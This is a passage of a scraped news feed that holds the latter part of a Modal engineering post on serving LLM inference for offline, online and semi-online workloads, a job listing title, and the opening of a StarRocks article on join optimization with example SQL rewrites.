split into two phases: prefill (aka prompt processing) and decode (aka generation). Prefill work can be further split into chunks. With care, all of these kinds of work can be scheduled together for different tasks in the same batch.&lt;/p&gt;With mixed batching, less-compute-intensive decode work (thinner lines) can piggyback on more compute-intensive prefill work (thicker lines). Colors indicate different tasks. For details, see the SARATHI paper.&lt;p&gt;The vLLM inference engine has better support for these scheduling optimizations. For this reason, we currently recommend it for throughput-sensitive, offline workloads.&lt;/p&gt;&lt;head rend="h3"&gt;Implementation&lt;/head&gt;&lt;p&gt;We make the following choices to optimize for throughput (per dollar) in offline applications:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;Run on vLLM with async scheduling and chunked prefill.&lt;/item&gt;&lt;item&gt;Send large batches in each request to expose maximum parallelism to the engine. This is easiest with an offline interface, like the &lt;code&gt;LLM&lt;/code&gt;abstraction in vLLM's Python SDK, rather than the online-serving-oriented HTTP server interfaces.&lt;/item&gt;&lt;item&gt;On Modal, use asynchronous RPC with &lt;code&gt;.spawn&lt;/code&gt;or&lt;code&gt;.spawn_map&lt;/code&gt;to queue up large numbers of requests for later retrieval or storage.&lt;/item&gt;&lt;item&gt;Limit the number of GPUs per replica to the minimum required to run on a large enough batch to saturate the GPU's compute resources. Excess available GPU capacity should be instead shifted to running more replicas.&lt;/item&gt;&lt;/list&gt;&lt;p&gt;You can find these patterns demonstrated and explained in detail in this code sample.&lt;/p&gt;&lt;head rend="h3"&gt;Future considerations&lt;/head&gt;&lt;p&gt;As the reliability of models increases and as their use becomes more commonplace, we expect more and more batch workloads to operate quietly in the background of many businesses, just as data analytics jobs, which started out as rare, heroic tabulations like censuses, are now humdrum table stakes.&lt;/p&gt;&lt;p&gt;We've noticed an interesting pattern in GPU pricing, which shows up in our own current rates at time of writing: the FLOPs per dollar is roughly constant, so older GPUs that might be easier to come by (in on-premises deployments) or available in larger quantities (on platforms like Modal) serve quite nicely for jobs that care about throughput per dollar more than they care about throughput per second.&lt;/p&gt;&lt;head rend="h2"&gt;Online workloads abhor latency&lt;/head&gt;&lt;quote&gt;&lt;p&gt;When a computer and its users interact at a pace that ensures that neither has to wait on the other, productivity soars, the cost of the work done on the computer tumbles, employees get more satisfaction from their work, and its quality tends to improve. Few online computer systems are this well balanced√¢¬¶&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Agents built with Decagon Voice need to participate in phone calls with humans requesting support help.&lt;/p&gt;&lt;p&gt;A leading AI IDE company needs to serve "smart" auto-completion in the brief intervals while human engineers consider what code to write next.&lt;/p&gt;&lt;p&gt;These systems are online: a human user is interacting with the system, and they want responses that match their (and other humans') reaction time, on the order of at most a few hundred milliseconds. Human users create multi-turn contexts from their repeated interactions.&lt;/p&gt;&lt;p&gt;Online systems are extremely challenging to build. They are extremely performance-sensitive, and performance melts abstractions and couples decoupled concerns. But they can be built, if you can solve the attendant challenges.&lt;/p&gt;&lt;head rend="h3"&gt;Challenge: Avoiding host overhead&lt;/head&gt;&lt;p&gt;The primary challenge of online workloads is that the system has only a few hundred milliseconds to respond.&lt;/p&gt;&lt;p&gt;First, that means that the performance hits from using interpreted languages, like Python, start to matter. Leading LLM inference engines are written mostly in Python, for faster development, and so they need to be architected and implemented carefully to avoid the work on the CPU (or host) from blocking the work on the GPU √¢ inflicting "host overhead". We wrote about the kinds of host overhead inference workloads encounter, and how we've contributed to inference engines to solve them, in this blog post.&lt;/p&gt;&lt;p&gt;In our experience, the SGLang inference engine wins here, since it generally exhibits lower host overhead.&lt;/p&gt;&lt;head rend="h3"&gt;Challenge: Reducing communications overhead&lt;/head&gt;&lt;p&gt;To repeat: the primary challenge of online workloads is that the system has only a few hundred milliseconds to respond.&lt;/p&gt;&lt;p&gt;We are here considering LLM inference services, rather than local applications, and so communication between the client and the system can introduce notable latency at this timescale. Specifically, networks operate at a large fraction of the speed of light, but that means tens or even hundreds of milliseconds of latency for clients (assumed Earthbound) to a system implemented in a single geographic location.&lt;/p&gt;&lt;p&gt;The solution is to deploy both routing proxies and accelerator capacity to "the edge", i.e. into datacenters that are close to clients. Quite apart from narrow-sense technical issues, this can prove challenging due to market conditions, as not all cloud providers have available capacity of all GPU types in all regions. At Modal, we solve this by aggregating capacity across clouds, which support regionalized service deployments.&lt;/p&gt;&lt;head rend="h3"&gt;Challenge: Handling multiple turns&lt;/head&gt;&lt;p&gt;Online workloads are interactive not just in latency requirement but also in request patterns. Human users respond to the system's response, which the system must respond to in turn.&lt;/p&gt;&lt;p&gt;Unlike a (nominally) stateless protocol like HTTP, efficient multi-turn LLM inference is stateful. It may not look that way, since clients generally provide the entire conversation history in their requests. But contemporary models based on the Transformer architecture have computation requirements that scale quadratically with conversation length. This can be exchanged for linear computation in exchange for storing a linear quantity of model activations, the "key-value cache" (originally and more descriptively known as the "past cache").&lt;/p&gt;&lt;p&gt;The solution is to route requests to LLM inference replicas based on the information used to populate the cache. For lossless cacheing, that means the prefix(es) of the request. This "prefix-aware" routing can look as simple as sticky sessions per conversation, which we provide native support for in Modal, or can involve deeper inspection of both request and cache contents.&lt;/p&gt;&lt;head rend="h3"&gt;Challenge: Wrangling the memory bound&lt;/head&gt;&lt;p&gt;The bottlenecking operations in LLM inference with KV caching have a low arithmetic intensity, which means inference is bound by memory.&lt;/p&gt;&lt;p&gt;Intuitively, you can generate only one or a few tokens per forward pass per request, but you must load all the model weights (typically numbered in the billions) into registers. Per user, those weights get used for roughly one add and one multiply, but ridge point arithmetic intensities for GPUs are in the hundreds or thousands of operations per byte √¢ and so, much arithmetic bandwidth will go to waste. Furthermore, even if the latency requirements and request load for the online service admit batching across requests, prefixes are generally mostly distinct per request for these workloads, and so distinct elements of the KV cache must be loaded per request. Cache contents start out negligible relative to model weights but grow with sequence length.&lt;/p&gt;&lt;p&gt;The foregoing arguments focus on throughput, but in online workloads, where latency is the primary concern, the situation is even worse. Because running a forward pass on a batch requires loading billions of model weights and memory bandwidths are measured in trillions of bytes per second, forward passes on single accelerators necessarily take milliseconds. Individual users cannot see lower per-token latencies than this. Autoregressive, i.e. sequential, generation stacks these latencies, rapidly eating into the latency budget, even for short generated sequences (another instance of Amdahl's heartbreaking law).&lt;/p&gt;&lt;p&gt;One resolution is to increase the memory bandwidth in the system (specifically, the memory bandwidth between model weights + KV cache and arithmetic units). On the hardware side, that means using the latest GPUs, like H100s and B200s, which offer substantial improvements in memory bandwidth over past generations.&lt;/p&gt;&lt;p&gt;Using multiple GPUs increases aggregate bandwidth. But just adding more GPUs isn't enough to cut latency. On the software side, systems must additionally take advantage of intra-task parallelism to split bandwidth demands across accelerators. The most common approach is tensor parallelism, which takes advantage of the inherent parallelism of matrix multiplications to split pieces of the multiplication onto different workers.&lt;/p&gt;Tensor parallelism splits a single matrix multiplication (left-hand-side of equation) across GPUs (represented by color; shared data on all GPUs in gray).&lt;p&gt;This requires low latency and high bandwidth, so it is usually done only within the backend/"scale-up" network, typically NVLink for GPUs. For many useful open source models applied to specific tasks, the standard eight-accelerator NVLink domain provides sufficient memory bandwidth to hit interactive latency targets, but we anticipate a future where the larger, rack-scale NVLink domains offered by NVSwitch are required.&lt;/p&gt;&lt;p&gt;In addition to increasing memory bandwidth, systems can also decrease memory requirements, typically at a cost to model quality. Whether this trade-off is sensible is application-dependent √¢ another good reason to host your own inference!&lt;/p&gt;&lt;p&gt;The first lever to pull is floating point quantization. Generally, the performance benefit is greater if the hardware supports native floating point operations on the quantized data type: eight bit (FP8) for Hopper GPUs, four bit (FP4) for Blackwell GPUs.&lt;/p&gt;&lt;p&gt;For models above about seventy billion parameters, four bit quantization works well with minimal fuss. For smaller models, down to a billion parameters, only eight bit quantization retains sufficient model quality √¢ with the notable exception of gpt-oss 20B.&lt;/p&gt;&lt;p&gt;Finally, we note in passing that the reason for the mixture-of-experts (MoE) structure for feedforward layers in contemporary architectures is to reduce the demand on memory bandwidth. If you're comparing across models to determine memory requirements and serving cost, look at active parameters, not just total parameters!&lt;/p&gt;&lt;head rend="h3"&gt;Challenge: Cheating the speed of light&lt;/head&gt;&lt;p&gt;Eventually, the memory bound is inescapable, and latency cannot be reduced any further. The system has reached the metaphorical "speed of light" for the hardware.&lt;/p&gt;&lt;p&gt;The speed of light cannot be broken, but it can be cheated.&lt;/p&gt;&lt;p&gt;The key technique for memory-bound inference is speculative decoding, which takes advantage of some of the slack in arithmetic bandwidth in na√É¬Øve, single-token autoregressive inference.&lt;/p&gt;&lt;p&gt;Specifically, we use a simpler language modeling system, the speculator, to provide multiple sequential output tokens for the larger, target system to judge in parallel. Because inference is memory-bound, there are extra FLOPs to be had for running the speculator. Because the larger model already outputs probabilities for each token in its input, engines can straightforwardly ensure that outputs are unchanged (cf. "rejection sampling" from statistical inference).&lt;/p&gt;In speculative decoding, a speculator model produces "draft" tokens (light green) that are validated in parallel by the target model. Those with sufficiently high probability under the target model are accepted (dark green, lower right) and the first token that is rejected is replaced with a generation from the target model (orange).&lt;p&gt;This idea is well-worn by LLM inference standards, but until relatively recently, using more sophisticated draft models was hamstrung by operational difficulties that offset the limited performance gains. That left only very simple speculators, like "predict that the same subsequence will be repeated" (aka n-gram speculation), which generally have lower rates of acceptance and so speed up inference less.&lt;/p&gt;&lt;p&gt;The EAGLE-3 speculator training method changed that for us. Not only does it produce simple speculators with good support in open source engines, but it also achieves very high quality, measured in acceptance lengths. We have found that just adding EAGLE-3 via open source inference engines is sufficient to match the performance achieved by model providers with proprietary inference stacks. At time of writing, SGLang has better support for speculative decoding, another reason we recommend it for low latency applications.&lt;/p&gt;&lt;head rend="h3"&gt;Implementation&lt;/head&gt;&lt;p&gt;We make the following choices to optimize for low latency in online applications:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;run on SGLang to reduce host overhead and take full advantage of speculative decoding&lt;/item&gt;&lt;item&gt;use FP8 for smaller memory footprint and fast prefill and decode kernels on H100/H200 GPUs&lt;/item&gt;&lt;item&gt;apply extra tensor parallelism above any required by memory capacity in order to reduce memory read latency&lt;/item&gt;&lt;item&gt;use an off-the-shelf or custom-trained EAGLE-3 speculator model&lt;/item&gt;&lt;item&gt;on Modal, use the &lt;code&gt;modal.experimental.http_server&lt;/code&gt;deployment decorator to create a regionalized, ultra-low-overhead web server with session-based routing&lt;/item&gt;&lt;/list&gt;&lt;p&gt;You can see this in action in a code sample here.&lt;/p&gt;&lt;head rend="h3"&gt;Future considerations&lt;/head&gt;&lt;p&gt;Because of the tremendous investment in and excitement over chatbots, this workload has received substantial engineering work already and its future is slightly easier to chart.&lt;/p&gt;&lt;p&gt;First, we expect more ways to "cheat the speed of light" to become important in the near future, in particular lossy optimizations that sacrifice some performance for a lot of speed. A few we didn't mention above, but which are the targets of current research: approximate KV cacheing, layer skipping, pruning, lossy compression of the KV cache, lossy speculation. Many of these techniques are already reasonably mature in the world of diffusion models, where other opportunities for speedups are limited (see our blog post on accelerating Flux).&lt;/p&gt;&lt;p&gt;Note that because these optimizations are "lossy", they change the hosted model, in the statistical sense. Behavior is guaranteed to change, if only slightly. That makes for a good economic reason to self-host: you can check which optimizations work for your workload.&lt;/p&gt;For some workloads, fully lossless performance improvements like speculative decoding might be insufficient to achieve target latency (vertical arrow). The right lossy performance improvements (angled arrows) to achieve the target speed and latency (colored regions) differ between workloads (indicated by color).&lt;p&gt;In part due to the investments of existing hardware providers and the crop of inference hardware startups, we expect these workloads to move increasingly onto more exotic hardware that even less resembles a typical workstation or generic high-performance machine in the cloud.&lt;/p&gt;&lt;p&gt;Nvidia is investing heavily in tightly-interconnected systems, e.g. "rack-scale" NVL72/CPX Rubin. This architecture can achieve massive memory bandwidth at low latency without using components that are too exotic relative to existing systems (for instance, using HBM for system memory). Following the same logic, Google is building large TPU systems with a similar architecture. Doing better requires deeper innovation at the silicon layer, likely in the form of application-specific integrated circuits for specific model architectures. To reach one billion tokens per second, for instance, would require tightly co-locating storage and compute, e.g. with analog elements.&lt;/p&gt;&lt;p&gt;While we don't expect these systems to go without demand, we expect the relative importance of online/chat workloads to decrease over time. The current interest has been driven by the initial "killer app" for LLMs, OpenAI's ChatGPT. This has led to lots of imitation and herding behavior by capital providers, investors, founders, and even application developers.&lt;/p&gt;&lt;p&gt;But we are already seeing the signs of a different "killer app" emerging √¢ long-running background agents, like Claude Code, which have the patience of machines, rather than humans. These applications generate quite different workloads, to which we turn in the next section.&lt;/p&gt;&lt;head rend="h2"&gt;Semi-online workloads demand flexibility&lt;/head&gt;&lt;quote&gt;&lt;p&gt;Roughly speaking, the cost of a system scales with its (short-term) peak traffic, but for most applications the value the system generates scales with the (long-term) average traffic. The gap between "paying for peak" and "earning on average" is critical to understand how the economics of large-scale cloud systems differ from traditional single-tenant systems.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Users of Reducto's document processing platform sometimes upload a single form for immediate perusal and sometimes drop their business's entire document storage.&lt;/p&gt;&lt;p&gt;An AI news analytics agency needs to scale up its news agents in minutes in response to breaking news, crawling a variety of sources to produce syntheses. It also needs to produce a "daily newspaper" on a longer cadence.&lt;/p&gt;&lt;p&gt;These systems are semi-online: sometimes they must return to a waiting human; other times they pass their results on to another computer system in a pipeline (which might be another agent). Even when they directly serve human users, they are not as tightly interactive. Their workloads are bursty √¢ sometimes load goes to hundreds of times baseline for minutes or tens of minutes.&lt;/p&gt;&lt;head rend="h3"&gt;Challenge: Taming peak-to-average load ratio&lt;/head&gt;&lt;p&gt;This high peak-to-average ratio creates a cost conundrum for systems serving these workloads, as alluded to by Marc Brooker of Amazon Web Services in the quote above. That is, costs are typically driven by requirements to service peak demand, but revenues are driven by servicing average demand.&lt;/p&gt;System costs are proportional to the allocated resources for peak demand (shaded area). Revenues are proportional to the realized demand for resources (area under the curve). When peak demand is much higher than average, systems without flexible resource allocations, as depicted in this figure, become uneconomical.&lt;p&gt;The solution we've taken at Modal is the same taken by AWS: aggregation and multitenancy. That is, we service a variety of these workloads on shared hardware, whose uncorrelated peaks aggregate into a smooth timeline of demand for that hardware. The peak-to-average load ratio is diminished.&lt;/p&gt;In a multi-tenant system (left, tenant resource demand indicated by colored lines), peak demand is reduced, cutting costs (shaded region). A group of single-tenant systems has, in the worst case scenario (right) cost per workload (each shaded region) close to the cost of the entire multi-tenant system.&lt;p&gt;We can then maintain a buffer sufficient to service resource requests immediately and acquire or release resources as the average changes. See this blog post for details on that system.&lt;/p&gt;&lt;head rend="h3"&gt;Challenge: Cutting cold starts from minutes to seconds&lt;/head&gt;&lt;p&gt;Multi-tenant computer systems have their drawbacks, including the addition of cold start latency. That is, even if the request for serving resources is serviced out of a buffer, configuring those resources to start handling the request takes some time: containers or VMs must boot, then inference engines must start.&lt;/p&gt;&lt;p&gt;Without optimization, container startup time can run into several minutes for large container images.&lt;/p&gt;&lt;p&gt;At Modal, we've invested heavily in techniques to accelerate container startup time, like mixing eager pre-fetching of files that will be used and lazy-loading of files that are unlikely to be used.&lt;/p&gt;&lt;p&gt;After optimization, container startup can be reduced to seconds. But engine initialization can still take tens of seconds.&lt;/p&gt;&lt;p&gt;For instance, the Torch JIT compiler can deliver massive speedups to inference passes, but it can take several minutes to run √¢ during which time the inference server replica cannot service requests.&lt;/p&gt;&lt;p&gt;Our solution is GPU memory snapshotting. Just before an inference server replica is ready to service requests, we dump the program state to the filesystem. When we spin up a new replica, it is loaded straight from the filesystem, skipping computations like Torch JIT compilation (and also converting a large number of small file I/Os into one large I/O, which is a better fit to storage systems).&lt;/p&gt;Memory snapshotting can cut down inference server start times by a factor of 10, requiring only that the server be&lt;code&gt;restore&lt;/code&gt;d from
      serialized snapshot storage (drum icon). Rapid scaleup improves response
      time under sudden bursts of load (yellow &lt;code&gt;/chat/completions&lt;/code&gt; requests). &lt;p&gt;We have benchmarked GPU snapshotting across a wide class of models and found that it can cut LLM inference server start times from minutes to seconds.&lt;/p&gt;&lt;head rend="h3"&gt;Implementation&lt;/head&gt;&lt;p&gt;We make the following choices to optimize for flexible scaling in semi-online applications:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;Use fast-booting, autoscaling GPU resources to service variable load economically&lt;/item&gt;&lt;item&gt;While spot and on-demand B200s are still relatively scarce from hyperscalers, prefer H100s or H200s, which further indicates the use of FP8-quantized models&lt;/item&gt;&lt;item&gt;On Modal, use the &lt;code&gt;web_server&lt;/code&gt;deployment decorator to turn a Python program exposing an OpenAI-compatible server into a web service&lt;/item&gt;&lt;item&gt;Set auto-scaling policy to absorb small load bursts √¢ on Modal, that's done by setting &lt;code&gt;max_inputs&lt;/code&gt;to be higher than&lt;code&gt;target_inputs&lt;/code&gt;in the&lt;code&gt;modal.concurrent&lt;/code&gt;decorator&lt;/item&gt;&lt;item&gt;The choice of engine, between vLLM and SGLang, depends on other factors like model availability.&lt;/item&gt;&lt;item&gt;Use GPU memory snapshotting to speed up server boots, especially if your engine requires slow JIT compilation steps. Almost all programs can be snapshot, but many programs require some slight code rewrites to be snapshot.&lt;/item&gt;&lt;/list&gt;&lt;p&gt;You can find sample code for serving these workloads with SGLang here and with vLLM here.&lt;/p&gt;&lt;head rend="h3"&gt;Future considerations&lt;/head&gt;&lt;p&gt;We expect more of these semi-online applications to emerge as the field matures √¢ offline/analytical and online/transaction workloads are the obvious things to do, but there are many more tasks in the interior, combining traits of both.&lt;/p&gt;&lt;p&gt;In particular, we expect the salience of these workloads to increase as more work is done by long-running agents, which have the patience of computer systems, rather than humans. That is, human users will pay a large premium to avoid a small wait √¢ and productivity studies like Doherty &amp;amp; Thadhani's, quoted above, bear out that trade. But engineers architecting agents or systems of agents to complete long-running tasks will generally prefer the opposite trade. We look forward to servicing more of these workloads as builders and engineers discover and scale them.&lt;/p&gt;&lt;head rend="h2"&gt;What next?&lt;/head&gt;&lt;p&gt;We are still early in the era of LLM engineering, despite being several years into the era of LLMs, thanks to the head-start on capabilities achieved by proprietary model companies and proprietary inference engines.&lt;/p&gt;&lt;p&gt;But as in other domains, the underlying technologies are spreading enough to become commodities. The additional benefits of customization and control then tilt the balance increasingly in favor of building LLM inference in-house.&lt;/p&gt;&lt;p&gt;This requires additional engineering effort √¢ and a community effort to distribute knowledge, to upskill, and to produce open models and open source software. At Modal, we're happy to contribute to all of these. If you're interested in deploying your own inference at scale, talk to us.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46707708</guid><pubDate>Wed, 21 Jan 2026 16:15:06 +0000</pubDate></item><item><title>Autonomous (YC F25) is hiring ‚Äì AI-native financial advisor at 0% advisory fees</title><link>https://atg.science/</link><guid isPermaLink="false">https://news.ycombinator.com/item?id=46708315</guid><pubDate>Wed, 21 Jan 2026 17:00:54 +0000</pubDate></item><item><title>Challenges in join optimization</title><link>https://www.starrocks.io/blog/inside-starrocks-why-joins-are-faster-than-youd-expect</link><description>&lt;doc fingerprint="a7cc921b6dd81947"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Inside StarRocks: Why Joins Are Faster Than You‚Äôd Expect&lt;/head&gt;
    &lt;quote&gt;‚úçüèº About The Author:Seaven He, StarRocks Committer, Engineer at Celerdata&lt;/quote&gt;
    &lt;p&gt;StarRocks takes the opposite approach: keep data normalized and make joins fast enough to run on the fly. The challenge is the plan. In a distributed system, the join search space is huge, and a good plan can be orders of magnitude faster.&lt;/p&gt;
    &lt;p&gt;This deep dive explains how StarRocks‚Äô cost-based optimizer makes that possible, in four parts: join fundamentals and optimization challenges, logical join optimizations, join reordering, and distributed join planning. Finally, we examine real-world case studies from NAVER, Demandbase, and Shopee to illustrate how efficient join execution delivers tangible business value.&lt;/p&gt;
    &lt;head rend="h2"&gt;Join Fundamentals and Optimization Challenges&lt;/head&gt;
    &lt;head rend="h3"&gt;1.1 Join Types&lt;/head&gt;
    &lt;p&gt;The diagram above illustrates several common join types:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Cross Join: Produces a Cartesian product between the left and right tables.&lt;/item&gt;
      &lt;item&gt;Full / Left / Right Outer Join: For rows that do not find a match, outer joins return results with &lt;code&gt;NULL&lt;/code&gt;values filled in according to the join semantics‚Äîon both tables (full), the left table (left), or the right table (right).&lt;/item&gt;
      &lt;item&gt;Anti Join: Returns rows that do not have a matching counterpart in the join relationship. Anti-joins typically appear in query plans for &lt;code&gt;NOT IN&lt;/code&gt;or&lt;code&gt;NOT EXISTS&lt;/code&gt;subqueries.&lt;/item&gt;
      &lt;item&gt;Semi Join: The opposite of an anti-join, it returns only rows that do have a match in the join relationship, without producing duplicate result rows from the matching side.&lt;/item&gt;
      &lt;item&gt;Inner Join: Returns the intersection of the left and right tables. Based on the join condition, it may generate one-to-many result rows.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;1.2 Challenges in Join Optimization&lt;/head&gt;
    &lt;p&gt;Join performance optimization generally falls into two areas:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;improving the efficiency of join operators on a single node, and&lt;/item&gt;
      &lt;item&gt;designing a reasonable join plan that minimizes input size and execution cost.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This article focuses on the second aspect. To set the stage, we begin by examining the key challenges in join optimization.&lt;/p&gt;
    &lt;p&gt;Challenge 1: Multiple Join Implementation Strategies&lt;/p&gt;
    &lt;p&gt;As shown above, different join algorithms perform very differently depending on the scenario. For example, Sort-Merge Join can be significantly more efficient than Hash Join when operating on already sorted data. However, in distributed databases where data is typically hash-partitioned, Hash Join often outperforms Sort-Merge Join by a wide margin. As a result, the database must choose the most appropriate join strategy based on the specific workload and data characteristics.&lt;/p&gt;
    &lt;p&gt;Challenge 2: Join Order Selection in Multi-Table Joins&lt;/p&gt;
    &lt;p&gt;In multi-table join scenarios, executing highly selective joins first can significantly improve overall query performance. However, determining the optimal join order is far from trivial.&lt;/p&gt;
    &lt;p&gt;As illustrated above, under a left-deep join tree model, the number of possible join orders for N tables is on the order of &lt;code&gt;2^n-1&lt;/code&gt;. Under a¬†bushy join tree¬†model, the number of possible combinations grows even more dramatically, reaching¬†&lt;code&gt;2^(n-1) * C(n-1)&lt;/code&gt;. For a database optimizer, the time and cost required to search for the optimal join order therefore increases¬†exponentially, making join ordering one of the most challenging problems in query optimization.&lt;/p&gt;
    &lt;p&gt;Challenge 3: Difficulty in Estimating Join Effectiveness&lt;/p&gt;
    &lt;p&gt;Before query execution, it is extremely difficult for the database to accurately predict the real execution behavior of a join. A common assumption is that joining a small table with a large table is more selective than joining two large tables, but this is not always true.&lt;/p&gt;
    &lt;p&gt;In practice, one-to-many relationships are common, and in more complex queries, joins are often combined with filters, aggregations, and other operators. After data flows through multiple transformations, the optimizer‚Äôs ability to accurately estimate join input sizes and selectivity degrades significantly.&lt;/p&gt;
    &lt;p&gt;Challenge 4: A Single-Node Optimal Plan Is Not Necessarily Optimal in Distributed Systems&lt;/p&gt;
    &lt;p&gt;In distributed systems, data often needs to be reshuffled or broadcast across nodes so that the required records can participate in join computation. Distributed joins are no exception.&lt;/p&gt;
    &lt;p&gt;This introduces a key complication: an execution plan that is optimal in a single-node database may perform poorly in a distributed environment because it ignores data distribution and network transfer costs.&lt;/p&gt;
    &lt;p&gt;Therefore, when planning join execution strategies in distributed databases, the optimizer must explicitly account for data placement and communication overhead in addition to local execution efficiency.&lt;/p&gt;
    &lt;head rend="h3"&gt;1.3 SQL Optimization Workflow&lt;/head&gt;
    &lt;p&gt;In StarRocks, SQL optimization is primarily handled by the query optimizer and is mainly concentrated in the Rewrite and Optimize phases.&lt;/p&gt;
    &lt;head rend="h3"&gt;1.4 Principles of Join Optimization&lt;/head&gt;
    &lt;p&gt;At present, StarRocks primarily uses Hash Join as its join algorithm. By default, the right-hand table is used to build the hash table. Based on this design choice, we summarize five key optimization principles:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Different join types have very different performance characteristics. Whenever possible, prefer higher-performance join types and avoid expensive ones. Based on the typical size of join outputs, the rough performance ranking is: Semi Join / Anti Join &amp;gt; Inner Join &amp;gt; Outer Join &amp;gt; Full Outer Join &amp;gt; Cross Join.&lt;/item&gt;
      &lt;item&gt;When using Hash Join, building the hash table on a smaller input is significantly more efficient than building it on a large table.&lt;/item&gt;
      &lt;item&gt;In multi-table joins, prioritize joins with high selectivity.&lt;/item&gt;
      &lt;item&gt;Minimize the amount of data participating in joins whenever possible.&lt;/item&gt;
      &lt;item&gt;Minimize network overhead introduced by distributed joins.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Join Logical Optimization&lt;/head&gt;
    &lt;p&gt;This section introduces a set of heuristic rules used by StarRocks to optimize joins at the logical level.&lt;/p&gt;
    &lt;head rend="h3"&gt;2.1 Type Transformations&lt;/head&gt;
    &lt;p&gt;The first group of optimizations directly follows the first join optimization principle discussed earlier: transform low-efficiency join types into more efficient ones whenever the semantics allow it.&lt;/p&gt;
    &lt;p&gt;StarRocks currently applies three major transformation rules.&lt;/p&gt;
    &lt;p&gt;Rule 1: Converting a Cross Join into an Inner Join&lt;/p&gt;
    &lt;p&gt;A Cross Join can be rewritten as an Inner Join when it satisfies the following condition:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;There exists at least one predicate that expresses a join relationship between the two tables.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For example:&lt;/p&gt;
    &lt;code&gt;-- Before transformation&lt;lb/&gt;SELECT * FROM t1, t2 WHERE t1.v1 = t2.v1&lt;lb/&gt;&lt;lb/&gt;-- After transformation&lt;lb/&gt;-- WHERE t1.v1 = t2.v1 is a join predicate&lt;lb/&gt;SELECT * FROM t1 INNER JOIN t2 ON t1.v1 = t2.v1;&lt;/code&gt;
    &lt;p&gt;Rule 2: Converting an Outer Join into an Inner Join&lt;/p&gt;
    &lt;p&gt;A Left / Right Outer Join can be rewritten as an Inner Join when the following conditions are met:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;There exists a predicate referencing the nullable side of the outer join (Right table for a Left Outer Join, or Left table for a Right Outer Join).&lt;/item&gt;
      &lt;item&gt;The predicate is a strict (null-rejecting) predicate.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Example:&lt;/p&gt;
    &lt;code&gt;-- Before transformation&lt;lb/&gt;SELECT * FROM t1 LEFT OUTER JOIN t2 ON t1.v1 = t2.v1 WHERE t2.v1 &amp;gt; 0;&lt;lb/&gt;&lt;lb/&gt;-- After transformation&lt;lb/&gt;-- t2.v1 &amp;gt; 0 is a strict predicate on t2&lt;lb/&gt;SELECT * FROM t1 INNER JOIN t2 ON t1.v1 = t2.v1 WHERE t2.v1 &amp;gt; 0;&lt;/code&gt;
    &lt;p&gt;‚ö†Ô∏è Important note: In an outer join, &lt;code&gt;ON&lt;/code&gt;¬†clause predicates participate in¬†null extension, not filtering. Therefore, this rule does¬†not¬†apply to join predicates inside the¬†&lt;code&gt;ON&lt;/code&gt;¬†clause:&lt;/p&gt;
    &lt;code&gt;SELECT * FROM t1 LEFT OUTER JOIN t2 ON t1.v1 = t2.v1 AND t2.v1 &amp;gt; 1;&lt;/code&gt;
    &lt;p&gt;This query is not semantically equivalent to:&lt;/p&gt;
    &lt;code&gt;SELECT * FROM t1 INNER JOIN t2 ON t1.v1 = t2.v1 AND t2.v1 &amp;gt; 1;&lt;/code&gt;
    &lt;p&gt;This introduces the concept of strict (null-rejecting) predicates. In StarRocks, a predicate that filters out &lt;code&gt;NULL&lt;/code&gt;¬†values is considered a¬†strict predicate, for example¬†&lt;code&gt;a &amp;gt; 0&lt;/code&gt;. Predicates that do not eliminate¬†&lt;code&gt;NULL&lt;/code&gt;¬†values are classified as¬†non-strict predicates, such as¬†&lt;code&gt;a IS NULL&lt;/code&gt;. Most predicates fall into the strict category; non-strict predicates are primarily those involving¬†&lt;code&gt;IS NULL&lt;/code&gt;,¬†&lt;code&gt;IF&lt;/code&gt;,¬†&lt;code&gt;CASE WHEN&lt;/code&gt;, or certain function-based expressions.&lt;/p&gt;
    &lt;p&gt;To determine whether a predicate is strict, StarRocks uses a simple yet effective approach: all referenced columns are replaced with &lt;code&gt;NULL&lt;/code&gt;, and the expression is then simplified. If the result evaluates to¬†&lt;code&gt;TRUE&lt;/code&gt;, it means the¬†&lt;code&gt;WHERE&lt;/code&gt;¬†clause does not filter out rows with¬†&lt;code&gt;NULL&lt;/code&gt;¬†inputs, and the predicate is therefore non-strict. Conversely, if the result evaluates to¬†&lt;code&gt;FALSE&lt;/code&gt;¬†or¬†&lt;code&gt;NULL&lt;/code&gt;, the predicate is considered strict.&lt;/p&gt;
    &lt;p&gt;Rule 3: Converting a Full Outer Join into a Left / Right Outer Join&lt;/p&gt;
    &lt;p&gt;A Full Outer Join can be rewritten as a Left Outer Join or Right Outer Join when the following condition is satisfied:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;There exists a strict predicate that can be bound exclusively to the left or right table.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Example:&lt;/p&gt;
    &lt;code&gt;-- Before transformation&lt;lb/&gt;SELECT * FROM t1 FULL OUTER JOIN t2 ON t1.v1 = t2.v1 WHERE t1.v1 &amp;gt; 0;&lt;lb/&gt;&lt;lb/&gt;-- After transformation&lt;lb/&gt;-- t1.v1 &amp;gt; 0 is a strict predicate on the left table&lt;lb/&gt;SELECT * FROM t1 LEFT OUTER JOIN t2 ON t1.v1 = t2.v1 WHERE t1.v1 &amp;gt; 0;&lt;/code&gt;
    &lt;head rend="h3"&gt;2.2 Predicate Pushdown&lt;/head&gt;
    &lt;p&gt;Predicate pushdown is one of the most important and commonly used join optimization techniques. Its primary purpose is to filter join inputs as early as possible, thereby reducing the amount of data involved in the join and improving overall performance.&lt;/p&gt;
